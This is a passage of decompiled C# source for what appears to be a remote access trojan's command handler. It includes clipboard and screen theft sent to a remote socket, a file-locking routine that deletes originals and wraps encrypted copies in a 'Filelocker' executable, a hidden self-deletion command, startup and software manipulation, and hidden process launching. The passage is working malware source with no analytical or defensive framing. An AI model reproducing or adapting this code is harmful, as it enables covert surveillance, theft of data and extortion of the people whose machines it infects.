                    ProjectData.ClearProjectError();
                }
                Funzioni.BlueScreenOnTermination(false);
                MySettingsProperty.Settings.Persistence = "False";
                MySettingsProperty.Settings.Save();
                MySettingsProperty.Settings.Reload();
                MyProject.Forms.Form1.DeletKey();
                string str17 = "/C ping 1.1.1.1 -n -l -w 1 > Null & Del \"" + Application.ExecutablePath + "\"";
                ProcessStartInfo info6 = new ProcessStartInfo("cmd.exe", str17);
                info6.CreateNoWindow = true;
                info6.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info6);
                Process.GetCurrentProcess().Kill();
            }
            else if (str19 == "LockF")
            {
                HandleLockFileCommands(parameter);
            }
            else if (str19 == "STRs")
            {
                StartUPCode.GetStartUP();
            }
            else if (str19 == "CLP")
            {
                string str18 = GetClipboardText();
                if (str18 == null)
                {
                    str18 = "ClipBoard is clear...";
                }
                Socketss.ListDataSend.Add(new Data("CLP|S|" + str18, null, null));
            }
            else if (str19 == "CLI")
            {
                Image image3 = null;
                try
                {
                    size = new Size(0x1ec, 0x131);
                    image3 = CodecDesktop.ResizeImage((Bitmap) GetClipboardImage(), size, true);
                }
                catch (Exception exception17)
                {
                    ProjectData.SetProjectError(exception17);
                    ProjectData.ClearProjectError();
                }
                Socketss.ListDataSend.Add(new Data("CLI", new Image[] { image3 }, null));
            }
            else if (str19 == "SOFT")
            {
                SoftwareCode.GetAnySoftware();
            }
            else if (str19 == "Rem")
            {
                StartUPCode.RemoveStartup(parameter[1], parameter[2], parameter[3]);
            }
            else if (str19 == "UNIA")
            {
                SoftwareCode.UninstallSoftwareByName(parameter[1]);
            }
        Label_2696:
            Thread.Sleep(15);
        }

        public static Image GetClipboardImage()
        {
            try
            {
                return Clipboard.GetImage();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return null;
        }

        public static string GetClipboardText()
        {
            string text;
            try
            {
                text = Clipboard.GetText();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                text = "Error";
                ProjectData.ClearProjectError();
                return text;
                ProjectData.ClearProjectError();
            }
            return text;
        }

        public static void GetDesktopChange()
        {
        Label_0002:;
            try
            {
                Image image = CaptureScreen.CaptureDesktop();
                Rectangle pointToChange = Desktopx.GetPointToChange((Bitmap) image);
                Image imageChanged = Desktopx.GetImageChanged(pointToChange);
                Socketss.ListDataSendDesktop.Add(new Data("I|S|" + Conversions.ToString(pointToChange.Size.Width) + "|S|" + Conversions.ToString(pointToChange.Size.Height) + "|S|" + Conversions.ToString(pointToChange.Left) + "|S|" + Conversions.ToString(pointToChange.Top), new Image[] { imageChanged }, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Thread.Sleep(10);
                ProjectData.ClearProjectError();
                goto Label_0002;
                ProjectData.ClearProjectError();
            }
        }

        private static void HandleLockFileCommands(object[] Values)
        {
            FileInfo info = new FileInfo(Conversions.ToString(Values[1]));
            byte[] data = File.ReadAllBytes(info.FullName);
            Serializer serializer = new Serializer();
            string path = info.FullName + ".exe";
            byte[] buffer = serializer.Serialize(new object[] { RuntimeHelpers.GetObjectValue(Values[2]), RuntimeHelpers.GetObjectValue(Values[3]), info.Name, info.Length, MakeString(Conversions.ToString(Values[4])) });
            File.Delete(info.FullName);
            File.WriteAllBytes(path, Chat.My.Resources.Resources.Filelocker);
            object[] objArray4 = new object[2];
            object[] objArray2 = new object[1];
            object[] objArray = Values;
            int index = 4;
            objArray2[0] = RuntimeHelpers.GetObjectValue(objArray[index]);
            object[] arguments = objArray2;
            bool[] copyBack = new bool[] { true };
            if (copyBack[0])
            {
                objArray[index] = RuntimeHelpers.GetObjectValue(arguments[0]);
            }
            objArray4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Encoding.UTF8, null, "GetBytes", arguments, null, null, copyBack));
            objArray4[1] = data;
            object[] objArray5 = objArray4;
            bool[] flagArray2 = new bool[] { false, true };
            if (flagArray2[1])
            {
                data = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray5[1]), typeof(byte[]));
            }
            data = (byte[]) NewLateBinding.LateGet(null, typeof(ProtonCrypt), "Encrypt", objArray5, null, null, flagArray2);
            ResourceManager.WriteResource(path, "Details", buffer);
            ResourceManager.WriteResource(path, "File", data);
        }

        private static string MakeString(string Infos)
        {
            return Convert.ToBase64String(Sicurezza(Encoding.UTF8.GetBytes(Infos)));
        }

        [DllImport("winmm.dll", EntryPoint="mciSendStringA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long mciSendString([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, long uReturnLength, long hwndCallback);
        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int ShowWindow(int hwnd, int nCmd);
        public static byte[] Sicurezza(byte[] X)
        {
            using (RijndaelManaged managed = new RijndaelManaged())
            {
                managed.IV = new byte[] { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };
                managed.Key = new byte[] { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };
                return managed.CreateEncryptor().TransformFinalBlock(X, 0, X.Length);
            }
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern long SwapMouseButton(long bSwap);
        private static void TaskOpen(string[] spl)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(spl[1], spl[3]);
                startInfo.CreateNoWindow = true;
                if (spl[2] == "Hide")
                {
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                }
                else
                {
                    startInfo.WindowStyle = ProcessWindowStyle.Normal;
                }
                Process.Start(startInfo);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                Socketss.ListDataSend.Add(new Data("TaskME|S| Error to open : " + spl[1] + "\r\nError tipe : " + exception.ToString(), null, null));
                ProjectData.ClearProjectError();
            }
        }
    }
}

